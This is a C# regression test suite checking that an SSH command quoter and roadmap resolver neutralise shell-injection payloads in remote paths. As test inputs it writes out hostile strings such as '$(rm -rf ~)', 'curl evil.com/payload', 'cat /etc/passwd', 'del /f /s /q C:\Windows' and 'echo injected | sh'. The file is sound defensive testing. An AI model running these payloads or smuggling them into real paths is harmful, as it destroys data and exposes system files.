using System;
using System.Collections.Generic;
using ControlTower.Core.Contracts;
using ControlTower.Core.Models;
using ControlTower.Core.Ssh;
using ControlTower.Infrastructure.Registration;
using ControlTower.Infrastructure.Ssh;

namespace ControlTower.Tests;

/// <summary>
/// Regression suite for Sentinel H-1: remote command injection via unquoted paths.
/// Each test pins a specific injection payload and proves <see cref="SshCommandQuoter"/>
/// neutralises it before it can reach a remote shell.
///
/// Companion to <see cref="SshCommandQuoterTests"/> (unit coverage).
/// New coverage: realistic injection payloads, RoadmapResolver command construction,
/// and SshNetService.CreateDirectory fail-closed.
/// </summary>
public sealed class SshCommandInjectionRegressionTests
{
    // ── POSIX: $(...) command substitution ──────────────────────────────────

    [Fact]
    public void QuotePosix_CommandSubstitutionPayload_MetacharsEnclosedInSingleQuotes()
    {
        const string payload = "/tmp/proj$(rm -rf ~)";
        var result = SshCommandQuoter.QuotePosix(payload);

        // Full single-quote wrap: $( and ) are literal inside a POSIX single-quoted string.
        Assert.Equal("'/tmp/proj$(rm -rf ~)'", result);

        // Structural assertion: dangerous substring is inside the quoted span.
        Assert.StartsWith("'", result, StringComparison.Ordinal);
        Assert.EndsWith("'", result, StringComparison.Ordinal);
        var inner = result[1..^1];
        Assert.Contains("$(rm -rf ~)", inner, StringComparison.Ordinal);
    }

    // ── POSIX: backtick command substitution ────────────────────────────────

    [Fact]
    public void QuotePosix_BacktickPayload_MetacharsEnclosedInSingleQuotes()
    {
        const string payload = "/tmp/`id`";
        var result = SshCommandQuoter.QuotePosix(payload);

        // Backtick inside single quotes is literal; shell cannot execute `id`.
        Assert.Equal("'/tmp/`id`'", result);

        var inner = result[1..^1];
        Assert.Contains("`id`", inner, StringComparison.Ordinal);
    }

    // ── POSIX: semicolon command chaining ───────────────────────────────────

    [Fact]
    public void QuotePosix_SemicolonChainPayload_MetacharEnclosedInSingleQuotes()
    {
        const string payload = "/srv/a; touch /tmp/pwned";
        var result = SshCommandQuoter.QuotePosix(payload);

        // ; is literal inside single quotes; the touch command cannot chain.
        Assert.Equal("'/srv/a; touch /tmp/pwned'", result);

        var inner = result[1..^1];
        Assert.Contains(";", inner, StringComparison.Ordinal);
    }

    // ── POSIX: && chaining ───────────────────────────────────────────────────

    [Fact]
    public void QuotePosix_AndAndChainPayload_MetacharsEnclosedInSingleQuotes()
    {
        const string payload = "/srv/b && curl evil.com/payload";
        var result = SshCommandQuoter.QuotePosix(payload);

        // && is literal inside single quotes; curl cannot be chained.
        Assert.Equal("'/srv/b && curl evil.com/payload'", result);

        var inner = result[1..^1];
        Assert.Contains("&&", inner, StringComparison.Ordinal);
    }

    // ── POSIX: pipe ──────────────────────────────────────────────────────────

    [Fact]
    public void QuotePosix_PipePayload_MetacharEnclosedInSingleQuotes()
    {
        const string payload = "/srv/c | cat /etc/passwd";
        var result = SshCommandQuoter.QuotePosix(payload);

        // | is literal inside single quotes; cat cannot be piped.
        Assert.Equal("'/srv/c | cat /etc/passwd'", result);

        var inner = result[1..^1];
        Assert.Contains("|", inner, StringComparison.Ordinal);
    }

    // ── Windows: %VAR% environment variable expansion ────────────────────────

    [Fact]
    public void QuoteWindows_EnvVarExpansionPayload_IsRejected()
    {
        const string payload = @"C:\proj%USERPROFILE%";
        Assert.Throws<ArgumentException>(() => SshCommandQuoter.QuoteWindows(payload));
    }

    [Fact]
    public void QuoteWindows_EmbeddedQuotePayload_IsRejected()
    {
        const string payload = "repo\" & echo injected & rem \"";
        Assert.Throws<ArgumentException>(() => SshCommandQuoter.QuoteWindows(payload));
    }

    // ── Windows: & | < > neutralised inside double quotes ───────────────────

    [Fact]
    public void QuoteWindows_ChainAndPipePayload_MetacharsInsideDoubleQuotes()
    {
        const string payload = @"C:\proj & del /f /s /q C:\Windows | clip";
        var result = SshCommandQuoter.QuoteWindows(payload);

        // Outer double-quote wrapping neutralises & and | for cmd.exe.
        Assert.StartsWith("\"", result, StringComparison.Ordinal);
        Assert.EndsWith("\"", result, StringComparison.Ordinal);
        Assert.Equal("\"C:\\proj & del /f /s /q C:\\Windows | clip\"", result);

        var inner = result[1..^1];
        Assert.Contains("&", inner, StringComparison.Ordinal);
        Assert.Contains("|", inner, StringComparison.Ordinal);
    }

    // ── Fail-closed: CR / LF / NUL rejected outright ────────────────────────
    // Regression anchors for the injection fix — also covered in SshCommandQuoterTests.

    [Theory]
    [InlineData("/srv/proj\nevil")]
    [InlineData("/srv/proj\revil")]
    [InlineData("/srv/proj\0evil")]
    public void QuotePosixAndWindows_ControlCharPaths_ThrowArgumentException(string path)
    {
        Assert.Throws<ArgumentException>(() => SshCommandQuoter.QuotePosix(path));
        Assert.Throws<ArgumentException>(() => SshCommandQuoter.QuoteWindows(path));
    }

    // ── SshNetService.CreateDirectory: fail-closed, no real SSH server ───────

    [Fact]
    public void CreateDirectory_PathWithControlChar_ReturnsSshUnsafePathNotThrow()
    {
        // SshNetService with no policy: RunCommand returns ssh/no-host-key-store
        // (not success), so isWindows=false. QuotePosix then rejects the newline
        // path — CreateDirectory must convert the ArgumentException to a typed
        // SshResult rather than allowing it to propagate.
        var svc = new SshNetService();
        var result = svc.CreateDirectory("host", 22, "user", "pass", "/srv/proj\nevil");

        Assert.False(result.Success);
        Assert.Equal("ssh/unsafe-path", result.Code);
    }

    [Theory]
    [InlineData(
        "/srv/$(touch /tmp/pwned)",
        "'/srv/$(touch /tmp/pwned)/.github/roadmap.yaml'")]
    [InlineData(
        "/srv/roadmaps; echo injected | sh",
        "'/srv/roadmaps; echo injected | sh/.github/roadmap.yaml'")]
    [InlineData(
        "/srv/`id`",
        "'/srv/`id`/.github/roadmap.yaml'")]
    public void RoadmapResolver_PosixMetacharacterTarget_QuotesCompleteRemotePath(
        string remotePath,
        string expectedQuotedPath)
    {
        var ssh = new CapturingRoadmapSshService(isWindows: false);
        var resolver = CreateRoadmapResolver(ssh);
        var project = CreateSshProject(remotePath);

        var result = resolver.Resolve(project);

        Assert.NotNull(result);
        Assert.Equal("version: 2.1", result.Yaml);
        Assert.Equal(
            $"[ -f {expectedQuotedPath} ] && cat {expectedQuotedPath}",
            ssh.Commands[2]);
    }

    [Theory]
    [InlineData("C:\\repos\\bad\" & whoami & rem \"")]
    [InlineData(@"C:\repos\%TEMP%")]
    [InlineData(@"C:\repos\!PATH!")]
    public void RoadmapResolver_WindowsUnsafeTarget_FailsBeforeReadCommand(string remotePath)
    {
        var ssh = new CapturingRoadmapSshService(isWindows: true);
        var resolver = CreateRoadmapResolver(ssh);
        var project = CreateSshProject(remotePath);

        var exception = Assert.Throws<InvalidOperationException>(() => resolver.Resolve(project));

        Assert.StartsWith("ssh/unsafe-path:", exception.Message, StringComparison.Ordinal);
        Assert.Single(ssh.Commands);
        Assert.Equal("echo %OS%", ssh.Commands[0]);
    }

    [Fact]
    public void RoadmapResolver_PosixPathWithSpaces_PreservesValidPath()
    {
        var ssh = new CapturingRoadmapSshService(isWindows: false);
        var resolver = CreateRoadmapResolver(ssh);
        var project = CreateSshProject("/srv/road maps/project one");

        var result = resolver.Resolve(project);

        Assert.NotNull(result);
        Assert.Equal(".github/roadmap.yaml (ssh)", result.SourceLabel);
        Assert.Equal(
            "[ -f '/srv/road maps/project one/.github/roadmap.yaml' ] && " +
            "cat '/srv/road maps/project one/.github/roadmap.yaml'",
            ssh.Commands[2]);
    }

    [Fact]
    public void RoadmapResolver_WindowsPathWithSpaces_PreservesValidPath()
    {
        var ssh = new CapturingRoadmapSshService(isWindows: true);
        var resolver = CreateRoadmapResolver(ssh);
        var project = CreateSshProject(@"C:\Road Maps\project one");

        var result = resolver.Resolve(project);

        Assert.NotNull(result);
        Assert.Equal(".github/roadmap.yaml (ssh)", result.SourceLabel);
        Assert.Equal(
            "if exist \"C:\\Road Maps\\project one\\.github\\roadmap.yaml\" " +
            "type \"C:\\Road Maps\\project one\\.github\\roadmap.yaml\"",
            ssh.Commands[1]);
    }

    private static RoadmapResolver CreateRoadmapResolver(CapturingRoadmapSshService ssh)
    {
        var store = new RepoStore
        {
            Id = "ssh-store",
            Type = "ssh",
            Host = "example.test",
            User = "developer",
            Port = 22,
            CredentialTarget = "test-credential",
        };

        return new RoadmapResolver(
            ssh,
            new StaticStoreProvider(store),
            new StaticCredentialStore());
    }

    private static ProjectDefinition CreateSshProject(string remotePath)
    {
        var project = new ProjectDefinition();
        project.Locations.SshTarget = "developer@example.test:" + remotePath;
        return project;
    }

    private sealed class CapturingRoadmapSshService : ISshService
    {
        private readonly bool _isWindows;

        public CapturingRoadmapSshService(bool isWindows)
        {
            _isWindows = isWindows;
        }

        public List<string> Commands { get; } = new();

        public SshResult TestConnection(string host, int port, string user, string password)
            => SshResult.Ok();

        public SshResult CreateDirectory(
            string host,
            int port,
            string user,
            string password,
            string remotePath)
            => SshResult.Ok();

        public SshResult RunCommand(
            string host,
            int port,
            string user,
            string password,
            string command)
        {
            Commands.Add(command);

            if (command == "echo %OS%")
            {
                return SshResult.Ok(_isWindows ? "Windows_NT" : "%OS%");
            }

            if (command == "uname -s")
            {
                return _isWindows
                    ? SshResult.Fail("'uname' is not recognized")
                    : SshResult.Ok("Linux");
            }

            return SshResult.Ok("version: 2.1");
        }
    }

    private sealed class StaticStoreProvider : IStoreProvider
    {
        private readonly IReadOnlyList<RepoStore> _stores;

        public StaticStoreProvider(RepoStore store)
        {
            _stores = new[] { store };
        }

        public IReadOnlyList<RepoStore> GetStores() => _stores;

        public RepoStore? GetStore(string storeId)
        {
            foreach (var store in _stores)
            {
                if (string.Equals(store.Id, storeId, StringComparison.OrdinalIgnoreCase))
                {
                    return store;
                }
            }

            return null;
        }

        public string ResolveProjectPath(string storeId, string projectId, string folder) =>
            string.Empty;
    }

    private sealed class StaticCredentialStore : ICredentialStore
    {
        public string GetPassword(string target) => "password";

        public void SetPassword(string target, string password)
        {
        }

        public void DeletePassword(string target)
        {
        }
    }
}
